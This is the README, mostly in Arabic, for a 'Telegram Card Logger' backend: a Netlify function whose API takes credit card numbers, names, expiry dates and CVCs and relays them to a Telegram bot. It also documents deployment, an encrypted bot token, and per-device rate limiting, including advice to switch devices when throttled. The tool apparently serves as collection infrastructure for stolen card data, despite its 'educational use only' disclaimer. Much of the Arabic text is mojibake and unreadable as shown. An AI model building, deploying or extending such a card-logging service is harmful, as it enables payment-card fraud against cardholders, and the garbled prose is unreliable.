# ๐ Telegram Card Logger - Backend

ุจุงู ุฅูุฏ ุขูู ููุชููุฌุฑุงู ูุน ูุธุงู Rate Limiting ูุชูุฏู - **10 ุฑุณุงุฆู ููู ุฌูุงุฒ ูู ุงูุฏูููุฉ**

## ๐ ุงูููุฒุงุช

### ๐ ูุธุงู Rate Limiting ูุชูุฏู
- **10 ุฑุณุงุฆู ููุท ููู ุฌูุงุฒ ูู ุงูุฏูููุฉ**
- ุญุธุฑ ูุคูุช ููุฏุฉ 5 ุฏูุงุฆู ุนูุฏ ุชุฌุงูุฒ ุงูุญุฏ
- ุชุชุจุน ุงูุทูุจุงุช ุงููุชุจููุฉ ูุงูููุช ุงููุชุจูู
- ูุฑุงูุจุฉ ุงูุฃูุดุทุฉ ุงููุดุจููุฉ

### ๐ก๏ธ ุญูุงูุฉ ูุชุทูุฑุฉ
- ุชุดููุฑ ุงูุจูุงูุงุช ุงูุญุณุงุณุฉ
- ุงูุชุญูู ูู ุตุญุฉ ุงูุทูุจุงุช
- ูุฑุงูุจุฉ ุงูุฃูุดุทุฉ ุงููุดุจููุฉ
- ุญุธุฑ ุงูุฃุฌูุฒุฉ ุงููุฒุนุฌุฉ

## ๐ ูููู ุงููุดุฑูุน

```
backend/
โโโ netlify-functions/
โ   โโโ telegram-api-updated.js    # ุฏุงูุฉ Netlify ุงูุฑุฆูุณูุฉ
โโโ netlify.toml                   # ุฅุนุฏุงุฏุงุช Netlify
โโโ .gitignore                     # ูููุงุช ูุณุชุซูุงุฉ ูู Git
โโโ README_BACKEND.md              # ูุฐุง ุงูููู
```

## โ๏ธ ุงูุชุซุจูุช ูุงูุฅุนุฏุงุฏ

### 1. ุฅูุดุงุก ููุชุงุญ ุงูุชุดููุฑ

#### ุจุงุณุชุฎุฏุงู Node.js:
```bash
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

#### ุจุงุณุชุฎุฏุงู PowerShell:
```powershell
$bytes = New-Object Byte[] 32
(New-Object Security.Cryptography.RNGCryptoServiceProvider).GetBytes($bytes)
[System.BitConverter]::ToString($bytes) -replace '-', ''
```

### 2. ุฅุนุฏุงุฏ Netlify

#### ุฃ. ุฑูุน ุงููุดุฑูุน:
```bash
# ุชุซุจูุช Netlify CLI
npm install -g netlify-cli

# ุชุณุฌูู ุงูุฏุฎูู
netlify login

# ุฑูุน ุงููุดุฑูุน
netlify deploy --prod --dir=.
```

#### ุจ. ุฅุนุฏุงุฏ ูุชุบูุฑุงุช ุงูุจูุฆุฉ:
ูู ููุญุฉ ุชุญูู Netlify:
1. ุงุฐูุจ ุฅูู Site settings > Environment variables
2. ุฃุถู ูุชุบูุฑ ุฌุฏูุฏ:
   - **Key**: `ENCRYPTION_KEY`
   - **Value**: ุงูููุชุงุญ ุงูุฐู ุฃูุดุฃุชู

### 3. ุงูุญุตูู ุนูู ุฑุงุจุท API

ุจุนุฏ ุงููุดุฑุ ุณุชุญุตู ุนูู ุฑุงุจุท ูุซู:
```
https://your-site.netlify.app/.netlify/functions/telegram-api
```

## ๐ง ููููุฉ ุงูุงุณุชุฎุฏุงู

### API Endpoints

#### POST `/telegram-api`
ุฅุฑุณุงู ุฑุณุงูุฉ ุฅูู ุชููุฌุฑุงู

**Request Body:**
```json
{
  "data": {
    "type": "card",
    "message": {
      "number": "1234-5678-9012-3456",
      "name": "John Doe",
      "expiry": "12/25"
    }
  },
  "deviceFingerprint": "unique-device-id",
  "sessionKey": "session-key",
  "timestamp": 1640995200000,
  "signature": "calculated-signature"
}
```

**Response:**
```json
{
  "success": true,
  "message": "ุชู ุฅุฑุณุงู ุงูุฑุณุงูุฉ ุจูุฌุงุญ",
  "message_id": 123,
  "environment": "Netlify Functions",
  "rateLimit": {
    "remainingRequests": 9,
    "resetTime": 45
  }
}
```

#### GET `/telegram-api`
ุงูุญุตูู ุนูู ุฅุญุตุงุฆูุงุช ุงููุธุงู

**Response:**
```json
{
  "success": true,
  "stats": {
    "totalDevices": 5,
    "blockedDevices": 1,
    "rateLimitedDevices": 2,
    "environment": "Netlify Functions",
    "timestamp": "2024-01-01T00:00:00.000Z"
  }
}
```

## ๐ ุฃููุงุน ุงูุฑุณุงุฆู ุงููุฏุนููุฉ

### 1. ุจูุงูุงุช ุงูุจุทุงูุฉ
```json
{
  "type": "card",
  "message": {
    "number": "1234-5678-9012-3456",
    "name": "John Doe",
    "expiry": "12/25",
    "cvc": "123"
  }
}
```

### 2. ุจูุงูุงุช BIN
```json
{
  "type": "bin",
  "message": {
    "pattern": "123456",
    "name": "Visa",
    "cardNumber": "1234567890123456",
    "expiryDate": "12/25",
    "cvc": "123"
  }
}
```

### 3. ุฑุณุงูุฉ ุนุงุฏูุฉ
```json
{
  "type": "message",
  "message": "ุฑุณุงูุฉ ูุตูุฉ ุนุงุฏูุฉ"
}
```

## ๐ก๏ธ ุงูุฃูุงู

### ุชุดููุฑ ุงูุจูุงูุงุช
- ุชุดููุฑ ุชููู ุงูุจูุช ู Chat ID
- ุชูููุน ุงูุทูุจุงุช
- ูุญุต ุตุญุฉ ุงูุจูุงูุงุช

### Rate Limiting
- 10 ุฑุณุงุฆู ููู ุฌูุงุฒ ูู ุงูุฏูููุฉ
- ุญุธุฑ ูุคูุช ุนูุฏ ุงูุชุฌุงูุฒ
- ูุฑุงูุจุฉ ุงูุฃูุดุทุฉ ุงููุดุจููุฉ

### ุญูุงูุฉ ุฅุถุงููุฉ
- ูุญุต ููุช ุงูุทูุจ
- ุงูุชุญูู ูู ุงูุฌูุณุฉ
- ุญุธุฑ ุงูุฃุฌูุงุฒ ุงููุฒุนุฌุฉ

## ๐ ุงุณุชูุดุงู ุงูุฃุฎุทุงุก

### ูุดุงูู ุดุงุฆุนุฉ:

#### 1. ุฎุทุฃ ูู ุฅุนุฏุงุฏุงุช ุงูุจูุช
```
"error": "ุฎุทุฃ ูู ุฅุนุฏุงุฏุงุช ุงูุจูุช",
"code": "BOT_CONFIG_ERROR"
```
**ุงูุญู:** ุชุญูู ูู ุตุญุฉ ENCRYPTION_KEY

#### 2. ุชุฌุงูุฒ ุญุฏ ุงูุทูุจุงุช
```
"error": "ุชู ุชุฌุงูุฒ ุญุฏ ุงูุทูุจุงุช (10 ุฑุณุงุฆู ูู ุงูุฏูููุฉ)",
"code": "RATE_LIMIT_EXCEEDED"
```
**ุงูุญู:** ุงูุชุธุฑ 5 ุฏูุงุฆู ุฃู ุงุณุชุฎุฏู ุฌูุงุฒ ุขุฎุฑ

#### 3. ุทูุจ ููุชูู ุงูุตูุงุญูุฉ
```
"error": "ุทูุจ ููุชูู ุงูุตูุงุญูุฉ"
```
**ุงูุญู:** ุฃุนุฏ ุฅุฑุณุงู ุงูุทูุจ

## ๐ ุงููุฑุงูุจุฉ

### ุณุฌูุงุช Netlify
1. ุงุฐูุจ ุฅูู ููุญุฉ ุชุญูู Netlify
2. ุงุฎุชุฑ ูุดุฑูุนู
3. ุงุฐูุจ ุฅูู Functions
4. ุงุถุบุท ุนูู ุงูุฏุงูุฉ ูุนุฑุถ ุงูุณุฌูุงุช

### ุฅุญุตุงุฆูุงุช ุงููุธุงู
ุงุณุชุฎุฏู GET endpoint ููุญุตูู ุนูู ุฅุญุตุงุฆูุงุช ุงููุธุงู:
```bash
curl https://your-site.netlify.app/.netlify/functions/telegram-api
```

## ๐ ุงูุชุทููุฑ

### ุงูุชุทููุฑ ุงููุญูู
```bash
# ุชุซุจูุช Netlify CLI
npm install -g netlify-cli

# ุชุดุบูู ูุญูู
netlify dev
```

### ุงุฎุชุจุงุฑ ุงูุฏุงูุฉ
```bash
# ุงุฎุชุจุงุฑ ูุญูู
netlify functions:invoke telegram-api --body '{"data":{"type":"message","message":"test"}}'
```

## ๐ ุงูุฏุนู

ูููุณุงุนุฏุฉ ุฃู ุงูุฅุจูุงุบ ุนู ูุดุงูู:
1. ุฑุงุฌุน ูุฐุง ุงูููู ุฃููุงู
2. ุชุญูู ูู ุณุฌูุงุช Netlify
3. ุชุฃูุฏ ูู ุตุญุฉ ูุชุบูุฑุงุช ุงูุจูุฆุฉ

## ๐ ุงูุชุฑุฎูุต

ูุฐุง ุงููุดุฑูุน ูุฎุตุต ููุงุณุชุฎุฏุงู ุงูุชุนูููู ูุงูุจุญุซู ููุท.

---

**โ๏ธ ุชุญุฐูุฑ**: ูุฐุง ุงูุจุงู ุฅูุฏ ูุฎุตุต ููุงุณุชุฎุฏุงู ุงููุงูููู ููุท. ูุฑุฌู ุงุญุชุฑุงู ุฎุตูุตูุฉ ุงูุขุฎุฑูู ูููุงููู ุญูุงูุฉ ุงูุจูุงูุงุช. 